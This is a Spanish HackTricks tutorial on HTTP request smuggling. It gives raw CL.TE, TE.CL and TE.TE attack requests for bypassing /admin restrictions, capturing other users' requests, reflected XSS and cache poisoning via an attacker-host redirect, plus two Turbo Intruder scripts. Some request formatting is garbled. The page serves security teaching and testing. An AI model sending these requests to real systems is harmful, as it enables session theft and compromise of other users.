# Ataque de Desincronización de Solicitudes HTTP / Ataque de Desincronización HTTP

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**artículos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## ¿Qué es?

Esta vulnerabilidad ocurre cuando una **desincronización** entre los **proxies de front-end** y el **servidor de back-end** permite a un **atacante** **enviar** una **solicitud HTTP** que será **interpretada** como una **sola solicitud** por los **proxies de front-end** (balanceador de carga/proxy inverso) y **como 2 solicitudes** por el **servidor de back-end**.\
Esto permite a un usuario **modificar la siguiente solicitud que llega al servidor de back-end después de la suya**.

### Teoría

[Especificación RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este último DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tamaño del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificación utilizada para transferir de manera segura el cuerpo de carga útil al usuario.\
> Chunked significa que se envían datos grandes en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el encabezado _**transfer-encoding**_ y el **servidor de Back-end** **procesa el otro** provocando una **desincronización** entre los 2 sistemas.\
Esto podría ser muy crítico ya que **un atacante podrá enviar una solicitud** al proxy inverso que será **interpretada** por el **servidor de back-end como 2 solicitudes diferentes**. El **peligro** de esta técnica radica en el hecho de que el **servidor de back-end interpretará la 2da solicitud inyectada** como si **hubiera venido del siguiente cliente** y la **solicitud real** de ese cliente será **parte** de la **solicitud inyectada**.

### Particularidades

Recuerda que en HTTP **un carácter de nueva línea está compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **número decimal** para indicar el **número** de **bytes** del **cuerpo** de la solicitud. Se espera que el cuerpo termine en el último carácter, **no se necesita una nueva línea al final de la solicitud**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **número hexadecimal** para indicar el **número** de **bytes** del **próximo fragmento**. El **fragmento** debe **terminar** con una **nueva línea** pero esta nueva línea **no se cuenta** en el indicador de longitud. Este método de transferencia debe terminar con un **fragmento de tamaño 0 seguido de 2 nuevas líneas**: `0`
* **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera solicitud del Request Smuggling.

## Ejemplos Básicos

Entonces, los ataques de solicitud de contrabando implican colocar tanto el encabezado `Content-Length` como el encabezado `Transfer-Encoding` en una sola solicitud HTTP y manipularlos para que los servidores de front-end y back-end procesen la solicitud de manera diferente. La forma exacta en que se hace esto depende del comportamiento de los dos servidores:

* **CL.TE**: el servidor de front-end utiliza el encabezado `Content-Length` y el servidor de back-end utiliza el encabezado `Transfer-Encoding`.
* **TE.CL**: el servidor de front-end utiliza el encabezado `Transfer-Encoding` y el servidor de back-end utiliza el encabezado `Content-Length`.
* **TE.TE**: los servidores de front-end y back-end admiten ambos el encabezado `Transfer-Encoding`, pero se puede inducir a uno de los servidores a no procesarlo al ofuscar de alguna manera el encabezado.

### Vulnerabilidades CL.TE

Aquí, el **servidor de front-end** utiliza el encabezado **`Content-Length`** y el **servidor de back-end** utiliza el encabezado **`Transfer-Encoding`**. Podemos realizar un simple ataque de solicitud de contrabando HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Observa cómo `Content-Length` indica que la **longitud del cuerpo de la solicitud es de 30 bytes** (_recuerda que HTTP usa como nueva línea, por lo que son 2 bytes por cada nueva línea_), por lo que el proxy inverso **enviará la solicitud completa** al back-end, y el back-end procesará el encabezado `Transfer-Encoding` dejando el `GET /404 HTTP/1.1` como el **inicio de la siguiente solicitud** (por cierto, la siguiente solicitud se agregará a `Foo:x<Siguiente solicitud comienza aquí>`).

### Vulnerabilidades TE.CL

Aquí, el servidor de front-end utiliza el encabezado `Transfer-Encoding` y el servidor de back-end utiliza el encabezado `Content-Length`. Podemos realizar un simple ataque de solicitud de contrabando HTTP de la siguiente manera:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

En este caso, el **proxy inverso** enviará **toda la solicitud** al **back-end** ya que el **`Transfer-encoding`** lo indica así. Pero, el **back-end** solo procesará los **`7b`** (4 bytes) como se indica en el `Content-Length`. Por lo tanto, la siguiente solicitud será la que comience con `GET /404 HTTP/1.1`

_Nota que aunque el ataque debe terminar con un `0`, la siguiente solicitud se agregará como valores adicionales del parámetro **x**._\
_También ten en cuenta que el Content-Length de la solicitud incrustada indicará la longitud de la siguiente solicitud que se va a agregar al parámetro **x**. Si es demasiado pequeño, solo se agregarán unos pocos bytes, y si es demasiado grande (más grande que la longitud de la siguiente solicitud), se producirá un error para la siguiente solicitud._

### Vulnerabilidades TE.TE

Aquí, los servidores de front-end y back-end admiten ambos el encabezado `Transfer-Encoding`, pero uno de los servidores puede ser inducido a no procesarlo al ofuscar el encabezado de alguna manera.\
Potencialmente hay formas interminables de ofuscar el encabezado `Transfer-Encoding`. Por ejemplo:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Dependiendo del servidor (proxy inverso o de respaldo) que **deje de procesar** el encabezado **TE**, encontrarás una **vulnerabilidad CL.TE** o una **vulnerabilidad TE.CL**.

## Encontrar Solicitudes HTTP de Contrabando

### Encontrar vulnerabilidades CL.TE utilizando técnicas de temporización

Si una aplicación es vulnerable a la variante CL.TE de solicitud de contrabando, entonces enviar una solicitud como la siguiente a menudo causará un retraso en el tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Dado que el servidor front-end utiliza el encabezado `Content-Length`, solo reenviará parte de esta solicitud, omitiendo el `0`. El servidor back-end utiliza el encabezado `Transfer-Encoding`, procesa el primer fragmento y luego espera a que llegue el siguiente fragmento. Esto causará un retraso observable en el tiempo.

A veces, en lugar de recibir un tiempo de espera, se recibe una solicitud incorrecta 400 del host final como en el siguiente escenario, donde se envía un payload CL.TE:

![](<../../.gitbook/assets/image (444).png>)

Y la respuesta es una redirección que contiene un error dentro del cuerpo, incluso con la versión de haproxy utilizada:

![](<../../.gitbook/assets/image (443).png>)

### Encontrar vulnerabilidades TE.CL utilizando técnicas de temporización

Si una aplicación es vulnerable a la variante TE.CL de request smuggling, entonces enviar una solicitud como la siguiente a menudo causará un retraso en el tiempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### Sondeando vulnerabilidades de HTTP Request Smuggling

Una vez que hayas descubierto que las **técnicas de temporización funcionan**, necesitas **sondear** si puedes **alterar las solicitudes de otros clientes**.\
La forma más sencilla de hacer esto es intentar envenenar tus propias solicitudes, **hacer una solicitud para `/` y que devuelva un 404, por ejemplo**.\
En los [Ejemplos Básicos](./#basic-examples) ya vimos ejemplos de `CL.TE` y `TE.CL` de cómo envenenar una solicitud de un cliente para pedir `/404`, provocando una respuesta 404 cuando el cliente estaba solicitando cualquier otro recurso.

**Notas**

Al intentar confirmar vulnerabilidades de request smuggling mediante la interferencia con otras solicitudes, se deben tener en cuenta algunas consideraciones importantes:

* La solicitud de "ataque" y la solicitud "normal" deben enviarse al servidor utilizando conexiones de red diferentes. Enviar ambas solicitudes a través de la misma conexión no demostrará que la vulnerabilidad existe.
* La solicitud de "ataque" y la solicitud "normal" deben usar la misma URL y nombres de parámetros, en la medida de lo posible. Esto se debe a que muchas aplicaciones modernas dirigen las solicitudes de front-end a diferentes servidores de back-end según la URL y los parámetros. Usar la misma URL y parámetros aumenta la posibilidad de que las solicitudes sean procesadas por el mismo servidor de back-end, lo cual es esencial para que el ataque funcione.
* Al probar la solicitud "normal" para detectar cualquier interferencia de la solicitud "ataque", estás compitiendo con cualquier otra solicitud que la aplicación esté recibiendo al mismo tiempo, incluidas las de otros usuarios. Debes enviar la solicitud "normal" inmediatamente después de la solicitud "ataque". Si la aplicación está ocupada, es posible que necesites realizar varios intentos para confirmar la vulnerabilidad.
* En algunas aplicaciones, el servidor de front-end funciona como un balanceador de carga y reenvía las solicitudes a diferentes sistemas de back-end según algún algoritmo de equilibrio de carga. Si tus solicitudes "ataque" y "normal" se reenvían a diferentes sistemas de back-end, entonces el ataque fallará. Esta es una razón adicional por la que es posible que necesites intentarlo varias veces antes de que se pueda confirmar una vulnerabilidad.
* Si tu ataque tiene éxito al interferir con una solicitud posterior, pero esta no fue la solicitud "normal" que enviaste para detectar la interferencia, esto significa que otro usuario de la aplicación se vio afectado por tu ataque. Si continúas realizando la prueba, esto podría tener un efecto disruptivo en otros usuarios, por lo que debes tener precaución.

### Forzando a través de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podrías indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que sea posible abusar de un HTTP request smuggling**.
```
Connection: Content-Length
```
Para **más información sobre los encabezados hop-by-hop**, visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abuso de HTTP Request Smuggling

### Para evadir controles de seguridad del front-end

A veces los **proxies del front-end realizan algunas verificaciones de seguridad**. Puedes evitarlos abusando de HTTP Request Smuggling ya que podrás **burlar las protecciones**. Por ejemplo, en este caso **no puedes acceder a `/admin` desde el exterior** y el proxy del front-end lo está verificando, pero este **proxy no está verificando la solicitud incrustada**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando la reescritura de solicitudes del front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

En muchas aplicaciones, el **servidor del front-end realiza alguna reescritura de solicitudes** antes de enviarlas al servidor del back-end, típicamente agregando algunos encabezados de solicitud adicionales.\
Una acción común es **agregar al encabezado de la solicitud** `X-Forwarded-For: <IP del cliente>` u otro encabezado similar para que el back-end conozca la IP del cliente.\
A veces, si puedes **encontrar qué nuevos valores se agregan** a la solicitud, podrías ser capaz de **burlar protecciones** y **acceder a información oculta**/**puntos finales**.

Para descubrir cómo el proxy reescribe la solicitud, necesitas **encontrar un parámetro POST que el back-end reflejará en su valor** en la respuesta. Luego, utiliza este parámetro como el último y usa un exploit como este:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

En este caso, la próxima solicitud se agregará después de `search=`, que es también **el parámetro cuyo valor se reflejará** en la respuesta, por lo tanto, se **reflejarán los encabezados de la próxima solicitud**.

Ten en cuenta que **solo se reflejará la longitud indicada en el encabezado `Content-Length` de la solicitud incrustada**. Si usas un número bajo, solo se reflejarán unos pocos bytes, si usas un número mayor que la longitud de todos los encabezados, entonces la solicitud incrustada arrojará un error. Por lo tanto, debes **comenzar** con un **número pequeño** y **aumentarlo** hasta que veas todo lo que deseas ver.\
También ten en cuenta que esta **técnica también es explotable con una vulnerabilidad TE.CL** pero la solicitud debe terminar con `search=\r\n0`. Sin embargo, independientemente de los caracteres de nueva línea, los valores se agregarán al parámetro de búsqueda.

Finalmente, ten en cuenta que en este ataque todavía estamos atacándonos a nosotros mismos para aprender cómo el proxy del front-end está reescribiendo la solicitud.

### Capturando solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si puedes encontrar una solicitud POST que va a guardar el contenido de uno de los parámetros, puedes agregar la siguiente solicitud como el valor de ese parámetro para almacenar la solicitud del siguiente cliente:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

En este caso, el valor del **parámetro comentario** se guardará dentro de un comentario de una publicación en la página que es **públicamente accesible**, por lo que aparecerá un **comentario con el contenido de la siguiente solicitud**.

_Una limitación de esta técnica es que generalmente solo capturará datos hasta el delimitador de parámetros que es aplicable para la solicitud contrabandeada. Para envíos de formularios codificados en URL, esto será el carácter `&`, lo que significa que el contenido almacenado de la solicitud del usuario víctima terminará en el primer `&`, que incluso podría aparecer en la cadena de consulta._

Ten en cuenta también que esta **técnica también es explotable con una vulnerabilidad TE.CL** pero la solicitud debe terminar con `search=\r\n0`. Sin embargo, independientemente de los caracteres de nueva línea, los valores se agregarán al parámetro de búsqueda.

### Usar HTTP request smuggling para explotar XSS reflejado

Si la página web también es **vulnerable a XSS reflejado**, puedes abusar de HTTP Request Smuggling para atacar a los clientes de la web. La explotación de XSS reflejado desde HTTP Request Smuggling tiene algunas ventajas:

* **No requiere interacción con los usuarios víctima**
* Se puede usar para **explotar** el comportamiento de XSS en partes de la solicitud que **no pueden ser controladas trivialmente en un ataque de XSS reflejado normal**, como los encabezados de solicitud HTTP.

Si una web es vulnerable a XSS reflejado en el encabezado User-Agent, puedes usar este payload para explotarlo:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Usar HTTP request smuggling para convertir una redirección en el sitio en una redirección abierta <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

Muchas aplicaciones realizan redirecciones en el sitio de una URL a otra y colocan el nombre de host del encabezado `Host` de la solicitud en la URL de redirección. Un ejemplo de esto es el comportamiento predeterminado de los servidores web Apache e IIS, donde una solicitud para una carpeta sin una barra diagonal recibe una redirección a la misma carpeta incluyendo la barra diagonal:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Este comportamiento normalmente se considera inofensivo, pero puede ser explotado en un ataque de contrabando de solicitudes para redirigir a otros usuarios a un dominio externo. Por ejemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La solicitud contrabandeada desencadenará una redirección al sitio web del atacante, lo que afectará la solicitud del siguiente usuario que sea procesada por el servidor del back-end. Por ejemplo:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Aquí, la solicitud del usuario era para un archivo JavaScript que fue importado por una página en el sitio web. El atacante puede comprometer completamente al usuario víctima devolviendo su propio JavaScript en la respuesta.

### Usar HTTP request smuggling para realizar envenenamiento de caché web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si alguna parte de la **infraestructura del front-end realiza almacenamiento en caché de contenido** (generalmente por razones de rendimiento), **podría ser posible envenenar esa caché modificando la respuesta del servidor**.

Ya hemos visto cómo modificar el valor devuelto esperado del servidor a un 404 (en los [Ejemplos Básicos](./#basic-examples)), de manera similar podrías hacer que el servidor devuelva el contenido de `/index.html` cuando la solicitud envenenada esté pidiendo `/static/include.js`. De esta manera, el contenido de `/static/include.js` se almacenará con el contenido de `/index.html`, haciendo que `/static/include.js` sea inaccesible para los clientes (¿DoS?).

Esto es aún más interesante si encuentras alguna **Redirección Abierta** o alguna **redirección en el sitio a redirección abierta** (última sección). Porque podrías ser capaz de **cambiar los valores en caché** de `/static/include.js` con los **de un script controlado por ti** (realizando un **XSS general a todos los clientes** que intenten descargar la nueva versión de `/static/include.js`).

En este ejemplo se mostrará cómo puedes explotar un **envenenamiento de caché + redirección en el sitio a redirección abierta** para modificar los contenidos en caché de `/static/include.js` para **servir código JS controlado** por el atacante:

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Observa cómo la solicitud incrustada está pidiendo `/post/next?postId=3`. Esta solicitud será redirigida a `/post?postId=4` y **utilizará el valor del encabezado Host** para indicar el dominio. Por lo tanto, puedes **modificar el encabezado Host** para apuntar al servidor del atacante y la redirección usará ese dominio (**redirección en el sitio a redirección abierta**).

Luego, **después de envenenar el socket**, debes enviar una **solicitud GET** a \*\*`/static/include.js`\*\* esta solicitud será **envenenada** por la solicitud **de redirección en el sitio a redirección abierta** y **obtendrá los contenidos del script controlado por el atacante**.

La próxima vez que alguien solicite `/static/include.js`, se servirán los contenidos en caché del script del atacante (XSS general).

### Usar HTTP request smuggling para realizar engaño de caché web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¿Cuál es la diferencia entre envenenamiento de caché web y engaño de caché web?**
>
> * En **envenenamiento de caché web**, el atacante hace que la aplicación almacene algún contenido malicioso en la caché, y este contenido se sirve desde la caché a otros usuarios de la aplicación.
> * En **engaño de caché web**, el atacante hace que la aplicación almacene algún contenido sensible perteneciente a otro usuario en la caché, y luego el atacante recupera este contenido de la caché.

En esta variante, el atacante contrabandea una solicitud que devuelve algún contenido sensible específico del usuario. Por ejemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si el **veneno llega a un cliente que estaba accediendo a algún contenido estático** como `/someimage.png` que iba a ser **caché**, los contenidos de `/private/messages` del usuario víctima se almacenarán en `/someimage.png` y el atacante podrá robarlos.\
Ten en cuenta que el **atacante no sabe qué contenido estático estaba intentando acceder el usuario víctima** por lo que probablemente la mejor manera de probar esto es realizar el ataque, esperar unos segundos y **cargar todos** los contenidos estáticos y **buscar los datos privados**.

### Armando HTTP Request Smuggling con Desincronización de Respuesta HTTP

¿Has encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes cómo explotarla? Prueba este otro método de explotación:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Desde: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Más información

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagen desde aquí.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Herramientas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta herramienta es un Fuzzer HTTP basado en gramática útil para encontrar discrepancias extrañas en el tráfico de solicitudes.

## Referencias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
